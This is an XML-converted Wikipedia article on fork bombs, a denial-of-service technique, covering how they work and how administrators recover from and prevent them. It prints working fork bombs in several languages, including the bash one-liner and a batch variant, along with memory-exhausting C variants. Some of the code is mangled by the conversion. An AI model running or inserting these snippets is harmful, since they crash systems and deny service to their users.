<?xml version="1.0" encoding="UTF-8"?>
<!-- generated by CLiX/Wiki2XML [MPI-Inf, MMCI@UdS] $LastChangedRevision: 92 $ on 16.04.2009 16:40:43[mciao0826] -->
<!DOCTYPE article SYSTEM "../article.dtd">
<article xmlns:xlink="http://www.w3.org/1999/xlink">
<operation  confidence="0.8" wordnetid="100955060">
<event  confidence="0.8" wordnetid="100029378">
<attack  confidence="0.8" wordnetid="100972621">
<act  confidence="0.8" wordnetid="100030358">
<psychological_feature  confidence="0.8" wordnetid="100023100">
<activity  confidence="0.8" wordnetid="100407535">
<header>
<title>Fork bomb</title>
<id>261109</id>
<revision>
<id>244301930</id>
<timestamp>2008-10-10T04:32:19Z</timestamp>
<contributor>
<username>SunDragon34</username>
<id>6747322</id>
</contributor>
</revision>
<categories>
<category>Malware</category>
<category>Denial-of-service attacks</category>
</categories>
</header>
<bdy>

<image location="right" width="150px" src="Fork_bomb.svg" type="thumb">
<caption>

The concept behind the fork bomb: the processes recursively fork until a denial of service or a crash occurs
</caption>
</image>
<p>

In <link xlink:type="simple" xlink:href="../213/5213.xml">
computing</link>, the <b>fork bomb</b>, a form of <link>
 denial-of-service</link> attack against a <link xlink:type="simple" xlink:href="../457/7878457.xml">
computer system</link>, implements the <link xlink:type="simple" xlink:href="../507/301507.xml">
fork</link> operation (or equivalent functionality) whereby a running process can create another running process. Fork bombs count as  <link xlink:type="simple" xlink:href="../430/298430.xml">
wabbit</link>s: they typically do not spread as <link xlink:type="simple" xlink:href="../010/6010.xml">
worms</link> or <link xlink:type="simple" xlink:href="../679/19167679.xml">
viruses</link>. To incapacitate a system they rely on the assumption that the number of <link xlink:type="simple" xlink:href="../783/5783.xml">
program</link>s and <link xlink:type="simple" xlink:href="../178/45178.xml">
processes</link> which may execute simultaneously  on a computer has a limit. </p>
<p>

A fork bomb works by creating a large number of processes very quickly in order to saturate the available space in the list of processes kept by the computer's <link xlink:type="simple" xlink:href="../194/22194.xml">
operating system</link>. If the <link xlink:type="simple" xlink:href="../178/45178.xml">
process table</link> becomes saturated, no new programs may start until another process terminates.  Even if that happens, it is not likely that a useful program may be started since the instances of the bomb program will each attempt to take any newly-available slot themselves. </p>
<p>

Not only do fork bombs use space in the process table: each child process uses further processor-time and memory.  As a result of this, the system and existing programs slow down and become much more unresponsive and difficult or even impossible to use.</p>
<p>

As well as being specifically malicious, fork bombs can occur by accident in the normal development of software. The development of an application that listens on a <link xlink:type="simple" xlink:href="../218/4764218.xml">
network socket</link> and acts as the server in a <link xlink:type="simple" xlink:href="../513/6513.xml">
Client-server</link> system may well use an infinite loop and fork operation in a manner similar to one of the programs presented below. A trivial bug in the source of this kind of application could cause a fork bomb during testing.</p>

<sec>
<st>
 Example fork bombs </st>

<p>

The following code provides arguably one of the most <link xlink:type="simple" xlink:href="../136/18974136.xml">
elegant</link> examples of a fork bomb. <physical_entity wordnetid="100001930" confidence="0.8">
<person wordnetid="100007846" confidence="0.8">
<computer_user wordnetid="109951274" confidence="0.8">
<programmer wordnetid="110481268" confidence="0.8">
<engineer wordnetid="109615807" confidence="0.8">
<causal_agent wordnetid="100007347" confidence="0.8">
<link xlink:type="simple" xlink:href="../427/2401427.xml">
Jaromil</link></causal_agent>
</engineer>
</programmer>
</computer_user>
</person>
</physical_entity>
 presented it as an open-source piece of art in 2002. The user executes the fork bomb by pasting the following 13 characters into a <link xlink:type="simple" xlink:href="../642/31642.xml">
UNIX</link> shell such as <link xlink:type="simple" xlink:href="../547/4547.xml">
bash</link> or <link xlink:type="simple" xlink:href="../928/95928.xml">
zsh</link>.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%221%22])">1</ref></p>

<p>

<indent level="1">

(){ :|:&amp; };:
</indent>
</p>
<p>

A forkbomb using the <link xlink:type="simple" xlink:href="../890/18890.xml">
Microsoft Windows</link> (any version) <link xlink:type="simple" xlink:href="../030/15264030.xml">
batch</link> language:</p>
<p>

%0|%0</p>

<p>

Or a faster-reacting example (<b>warning!</b>: will most likely "<screen wordnetid="104152829" confidence="0.8">
<artifact wordnetid="100021939" confidence="0.8">
<surface wordnetid="104362025" confidence="0.8">
<link xlink:type="simple" xlink:href="../256/18909256.xml">
 blue-screen</link></surface>
</artifact>
</screen>
" the computer):</p>

<p>

<indent level="1">

s
</indent>
start %0
%0|%0
goto :s</p>

<p>

In <programming_language wordnetid="106898352" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../939/23939.xml">
Perl</link></programming_language>
:</p>
<p>

<list>
<entry level="1" type="number">

!/usr/bin/perl</entry>
</list>

fork while 1</p>

<p>

In <programming_language wordnetid="106898352" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../630/13630.xml">
Haskell</link></programming_language>
:</p>
<p>

import Control.Monad
import System.Posix.Process</p>
<p>

forkBomb = forever $ forkProcess forkBomb</p>

<p>

Using <link xlink:type="simple" xlink:href="../862/23862.xml">
Python</link>:</p>
<p>

import os</p>
<p>

while True:
os.fork()</p>

<p>

Or in <programming_language wordnetid="106898352" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../021/6021.xml">
C</link></programming_language>
:</p>
<p>

<list>
<entry level="1" type="number">

include </entry>
</list>
</p>
<p>

int main(int argc, char* argv)
{
while(1)
fork();
return 0;
}</p>

<p>

And in PHP (probably only for POSIX compatible systems):</p>
<p>

while(1)
pcntl_fork();</p>

<p>

In <link xlink:type="simple" xlink:href="../198/34198.xml">
x86</link> assembly for Linux (assemble with <link xlink:type="simple" xlink:href="../260/160260.xml">
FASM</link>):</p>
<p>

format ELF executable
entry start
start:
push	0x2       ; Linux fork system call
pop	eax       ;
int	0x80      ; Call to the kernel
jmp	start     ; Loop back to the start</p>


</sec>
<sec>
<st>
 Variants </st>

<p>

A common variant on the typical fork bomb involves allocating <link xlink:type="simple" xlink:href="../117/547117.xml">
heap memory</link> anonymously, causing a <link xlink:type="simple" xlink:href="../609/19609.xml">
memory leak</link> by design. This can quickly bring an operating system into <link xlink:type="simple" xlink:href="../354/32354.xml">
swap</link>, making it harder for a user or <link xlink:type="simple" xlink:href="../985/154985.xml">
sysadmin</link> to prevent an attack as the operating system becomes less responsive due to the overheads of paging. This can occur most easily when using a language that does not have <link xlink:type="simple" xlink:href="../801/1750801.xml">
managed</link> data types, such as <programming_language wordnetid="106898352" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../021/6021.xml">
C</link></programming_language>
, which makes system calls and libraries  easily accessible. For example:</p>

<p>

<list>
<entry level="1" type="number">

include </entry>
<entry level="1" type="number">

include </entry>
</list>
</p>
<p>

int main(void) {
/* An infinite loop. */
while (1) {
/* Try to allocate 1MB of memory. */
malloc(1048576);
/* Fork the process so that we have exponential growth in memory. */
fork();
}</p>
<p>

return EXIT_SUCCESS;
}</p>

<p>

By allocating memory on the heap the fork bomb process gains a much larger memory footprint than it would have otherwise had. It now takes fewer iterations of forking to consume physical system memory. On modern computer systems a simpler fork bomb might reach the operating system's process limit before using up system memory and going into swap.</p>
<p>

However, this may not actually cause as much damage as one might think. In many modern operating systems, such as <O wordnetid="106832680" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../297/6097297.xml">
Linux</link></O>
, the method of memory allocation limits the allocation of anonymous memory. To actually get physical memory a program must first try and write to it, see <link xlink:type="simple" xlink:href="../603/407603.xml#xpointer(//*[./st=%22Copy-on-write_in_virtual_memory%22])">
Copy-on-write in virtual memory</link>. For example in C one can try the following:</p>

<p>

<list>
<entry level="1" type="number">

include </entry>
<entry level="1" type="number">

include </entry>
</list>
</p>
<p>

int main(void) {
int *x;</p>
<p>

while (1) {
fork();
/* Allocate the memory to a pointer to int */
x = malloc(sizeof(int) * 1048576);
/* Try to use the newly allocated memory */
<list>
<entry level="1" type="bullet">

x = 0;</entry>
</list>

}</p>
<p>

return EXIT_SUCCESS;
}</p>


<p>

... but that would only change the first <link xlink:type="simple" xlink:href="../911/11254911.xml">
page</link> of <link xlink:type="simple" xlink:href="../354/32354.xml">
virtual memory</link> allocated by malloc. In order to effectively consume 1 MB of physical memory, one should modify at least one byte in each page.</p>

</sec>
<sec>
<st>
 Difficulty of cure </st>

<p>

Once a successful fork bomb has activated in a system one may have to <link xlink:type="simple" xlink:href="../909/40909.xml">
reboot</link> to resume normal operation, as one can only stop a fork bomb by destroying all instances of it. Trying to use a program to kill the rogue processes normally requires creating another process — a difficult or impossible task if the host machine has no empty slots in the process table, or no space in memory structures.</p>
<p>

However, in practice, system administrators can suppress some of these fork bombs relatively easily. Consider the shell fork bomb shown below:</p>

<p>

<indent level="1">

(){ :|:&amp; };:
</indent>
</p>
<p>

One important "feature" in this code means that a fork bomb process which can no longer fork doesn't stick around but rather exits. If we try often enough, eventually we'll start a new do-nothing process; Each new do-nothing process we run reduces the number of rampant "fork bomb" processes by one, until eventually we can eradicate all of them, at which point the do-nothing processes can exit. The following short <link xlink:type="simple" xlink:href="../928/95928.xml">
Z Shell</link> code will typically get rid of the above fork bomb in about a minute:</p>

<p>

while (sleep 100 &amp;!) do; done</p>

<p>

Note: the following code will log off the original user and fix the problem instantly — especially appropriate for a user on a server.</p>

<p>

kill -9 -1</p>


</sec>
<sec>
<st>
 Prevention </st>

<p>

One way to prevent a fork bomb involves limiting the number of processes that a single user may own.  When a process tries to create another process and the owner of that process already owns more than the maximum, the creation fails.  Administrators should set the maximum  low enough so that if all the users who might simultaneously bomb a system do so, enough resources still remain to avoid disaster.</p>
<p>

Note that an accidental fork bomb is highly unlikely to involve more than one user. A Linux kernel patch exists — called <link xlink:type="simple" xlink:href="../519/882519.xml">
grsecurity</link> — that enables logging of which user has started a fork bomb.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%222%22])">2</ref></p>
<p>

Unix-type systems typically have a process-limit, controlled by a <it>ulimit</it> shell command.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%223%22])">3</ref>
Linux kernels set and enforce the <b>RLIMIT_NPROC</b> rlimit ("resource limit") of a process.  If a process tries to perform a fork and the user that owns that process already owns more than <b>RLIMIT_NPROC</b> processes,then the fork fails. Additionally, on Linux or *BSD, one can edit the pam_limits config file: /etc/security/limits.conf<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%224%22])">4</ref>
to the same effect. However, not all distributions of Linux have the pam_limits module installed by default.</p>
<p>

Another solution, not widely practised, involves the detection of fork bombs by the operating system. However, the Linux kernel module called <it>rexFBD</it><ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%225%22])">5</ref>
implements this strategy.</p>
<p>

On FreeBSD the system administrator can put limits in login.conf<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%226%22])">6</ref>
for every user, effectively preventing using too many processes, memory, time and other resources. </p>
<p>

Note that simply limiting the number of processes a process may create does not prevent a fork bomb, because each process that the fork bomb creates also creates processes.  A distributive resource allocation system in which a process shares its parents' resources would work, but such distributive resource systems are not in common use.</p>

</sec>
<sec>
<st>
 Further challenges </st>

<p>

Even with the above precautions, fork bombs can still have disastrous effects on a system. For example, if a server has 24 CPUs and allows ordinary users to have up to 100 processes, a fork bomb can still saturate all 24 CPUs even after it can no longer multiply. This can make the system completely unresponsive, to the point where an administrator cannot log in to fix the problem.</p>

</sec>
<sec>
<st>
 Notes </st>

<p>

<reflist>
<entry id="1">
<weblink xlink:type="simple" xlink:href="http://www.digitalcraft.org/?artikel_id=292">
digitalcraft.org article by Jaromil</weblink>, though the code existed beforehand, for example in  this <weblink xlink:type="simple" xlink:href="http://groups.google.co.uk/group/muc.lists.bugtraq/browse_thread/thread/87d51562dd3599a/044c5404a9860dd4">
post to muc.lists.bugtraq</weblink>
</entry>
<entry id="2">
<weblink xlink:type="simple" xlink:href="http://grsecurity.net">
grsecurity Linux kernel patch</weblink>
</entry>
<entry id="3">
<weblink xlink:type="simple" xlink:href="http://linux.die.net/man/1/ulimit">
`man ulimit` online copy of the man page.</weblink>
</entry>
<entry id="4">
<weblink xlink:type="simple" xlink:href="http://linux.die.net/man/5/limits.conf">
`man limits` online copy of the man page.</weblink>
</entry>
<entry id="5">
<weblink xlink:type="simple" xlink:href="http://rexgrep.tripod.com/rexfbdmain.htm">
Linux kernel module for fork bomb prevention.</weblink>
</entry>
<entry id="6">
<weblink xlink:type="simple" xlink:href="http://www.freebsd.org/doc/en_US.ISO8859-1/books/handbook/users-limiting.html">
FreeBSD - login.conf</weblink>
</entry>
</reflist>
</p>


</sec>
<sec>
<st>
 See also </st>

<p>

<list>
<entry level="1" type="bullet">

 <parlance wordnetid="107081177" confidence="0.8">
<invertebrate wordnetid="101905661" confidence="0.8">
<arthropod wordnetid="101767661" confidence="0.8">
<formulation wordnetid="107069948" confidence="0.8">
<bug wordnetid="102236355" confidence="0.8">
<insect wordnetid="102159955" confidence="0.8">
<expressive_style wordnetid="107066659" confidence="0.8">
<animal wordnetid="100015388" confidence="0.8">
<link xlink:type="simple" xlink:href="../273/45273.xml">
Infinite loop</link></animal>
</expressive_style>
</insect>
</bug>
</formulation>
</arthropod>
</invertebrate>
</parlance>
</entry>
<entry level="1" type="bullet">

 <standard wordnetid="107260623" confidence="0.8">
<system_of_measurement wordnetid="113577171" confidence="0.8">
<link xlink:type="simple" xlink:href="../507/301507.xml">
Fork (operating system)</link></system_of_measurement>
</standard>
</entry>
<entry level="1" type="bullet">

 <link xlink:type="simple" xlink:href="../289/384289.xml">
malloc</link></entry>
</list>
</p>

</sec>
<sec>
<st>
 External links </st>

<p>

<list>
<entry level="1" type="bullet">

 <weblink xlink:type="simple" xlink:href="http://jazz.he.fi/jargon/html/F/fork-bomb.html">
Definition of "fork bomb"</weblink> in the <work wordnetid="104599396" confidence="0.8">
<product wordnetid="104007894" confidence="0.8">
<creation wordnetid="103129123" confidence="0.8">
<artifact wordnetid="100021939" confidence="0.8">
<oeuvre wordnetid="103841417" confidence="0.8">
<book wordnetid="106410904" confidence="0.8">
<end_product wordnetid="103287178" confidence="0.8">
<publication wordnetid="106589574" confidence="0.8">
<link xlink:type="simple" xlink:href="../054/16054.xml">
Jargon File</link></publication>
</end_product>
</book>
</oeuvre>
</artifact>
</creation>
</product>
</work>
</entry>
</list>
</p>


</sec>
</bdy>
</activity>
</psychological_feature>
</act>
</attack>
</event>
</operation>
</article>
